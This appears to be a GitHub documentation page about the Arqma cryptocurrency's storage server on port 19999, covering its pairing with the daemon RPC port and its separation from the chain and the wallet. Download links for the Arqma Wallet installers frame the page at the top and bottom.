![Arqma Wallet](assets/banner-article.png)

<h1 align="center">The Arqma storage server, and where it fits</h1>

<p align="center">The storage port, what it holds, and who can read a message.</p>

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-10134a?style=for-the-badge&labelColor=090d16&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="https://img.shields.io/badge/platform-Windows-d6efff?style=flat-square&labelColor=090d16&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=f9fcff"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

The storage server runs on port 19999 and is paired with the daemon RPC port. It is not the chain and it is not the wallet, and a wallet's documented connection is to a node's RPC port rather than to this one.

## What the published facts establish

Three things, and they are worth separating from the assumptions that usually follow them.

The port is 19999. The pairing is with the daemon's RPC port, which is 19994. The service is named for storage, so what it holds is storage rather than chain state.

What those facts do not include is a capacity figure, a configuration format or a command sequence. This article does not invent any of them.

## Why it is paired with the RPC port

The pairing is the documented relationship: the storage side is arranged around the daemon's RPC channel rather than around the peer layer.

That is a structural statement rather than an operational one. It tells you which port the storage service is adjacent to, and therefore which service has to exist before it means anything at all  -  the daemon, on 19994, on the same machine.

## What it is not

It is not the chain. The daemon holds and serves the chain; the storage server serves something else, which is why it needs its own port rather than a route through 19994.

It is not a wallet. A wallet asks a node about the chain, and it never asks the storage server for anything. [Arqma daemon and peers guide](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-daemon-and-peers.md) covers the channels a wallet does use.

## Where it sits in the network

What the facts place next to it is the daemon: the storage server is paired with the daemon's RPC port, and the daemon is the piece every other role builds on. Nothing in the published material used here assigns this port to a named operator role, and this page does not either.

That distinction matters for a reader who arrived from the Service Node side. [Arqma service node requirements](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-service-node-requirements.md) covers what that role requires; whether a given deployment also runs 19999 is a separate question from whether it can stake.

## The overlay next to it

Service-node-to-service-node communication runs over ArqNet, the project's anonymous, decentralised, IP-based overlay, and has used a separate ZMQ port since the release that introduced it.

That is a different channel from 19999 and a different subject from storage. Keeping them apart matters, because the port map is where both appear and neither is the chain. [Arqma daemon and peers guide](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-daemon-and-peers.md) lists the ZMQ port in the map.

## Why the port map is worth knowing

Because a blocked port and a stopped service look identical from outside. The map says which service owns which number, so a failure can be attributed rather than guessed at.

For the storage server that means one specific question: is 19999 reachable, and is the process behind it running? Everything else in the map answers the same question for a different service.

## Where storage sits relative to the chain

The chain is what the daemon holds and serves; storage is a role arranged around it. Keeping the two apart explains why a synced daemon is necessary but not sufficient for the storage role.

It also explains why the two have different footprints and different failure modes, and why one being healthy says nothing about the other.

## The pairing as a dependency

Pairing with the RPC port means the storage service is arranged around a daemon that exists on the same machine. Where that daemon is missing or not synced, the storage service has nothing to be arranged around.

That ordering is worth holding onto: the daemon first, then the roles that sit beside it. A machine can be built in the other order, and then the work is finding out which piece is waiting on which.

## What an operator has to hold

The chain, if the same machine also runs the daemon the storage service is paired with. That chain data lives at a fixed path, and on Windows it sits outside the wallet's per-user folder.

The wallet file is unrelated to any of this. A machine can serve storage without holding a wallet at all, and a wallet's security model says nothing about the storage role's. [Arqma wallet file backup guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-file-location-and-backup.md) covers which folder is which.

## Why a normal user does not need one

The default connection is a remote node, and the mobile apps always use one. Neither arrangement involves a storage server on the user's machine.

The role exists to serve the network, not to make a wallet work. A reader who simply wants to hold and send ARQ never encounters port 19999, and that is the expected case rather than an omission. The port exists for the network's benefit, not the wallet's.

## What to do if the role is unfamiliar

Read it as part of the service-node side: a separate process, a separate port, and a set of requirements that belong to the node rather than to the wallet.

The sequence is the one described elsewhere  -  node first, requirements next, extra roles after. [Arqma service node setup](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-service-node-setup.md) covers that order, and [Arqma full node guide](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-full-node.md) the daemon underneath it.

## The honest limit of this page

The project's published material used here establishes the port, the pairing and the role. It does not establish sizing, configuration or throughput, and none of those are guessed at above. Nor does it describe who is able to read what the server holds: no access model for this port appears in the facts used here, so none is described.

Where a number would be useful and is not published, the absence is the answer: an operator planning capacity should treat this page as the boundary of what is documented rather than as a starting estimate. The current release from the [Arqma Wallet v0.5.1.2 release](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2) is the build the notes belong to.

## FAQ

### What port does the storage server use?

19999, paired with the daemon RPC port.

### Does a wallet connect to it?

No. A wallet talks to the daemon's RPC channel and never to the storage server.

### Is it part of the chain?

No. The daemon serves the chain; storage is a separate role with its own port.

### Do I need one to use Arqma Wallet?

No. The default connection is a remote node, and mobile wallets always use one.

### Which role provides storage?

The storage server is its own service on 19999, paired with the daemon's RPC port; the published facts used here do not assign it to a named operator role.

---

## Download Arqma Wallet

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-10134a?style=for-the-badge&labelColor=090d16&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="https://img.shields.io/badge/platform-Windows-d6efff?style=flat-square&labelColor=090d16&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=f9fcff"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

---

## Related Arqma Wallet guides

| Guide | What it answers |
| --- | --- |
| [Arqma service node setup](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-service-node-setup.md) | A runbook for registering, funding and monitoring a service node. |
| [Arqma service node requirements](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-service-node-requirements.md) | The stake, address and uptime a service node must hold. |
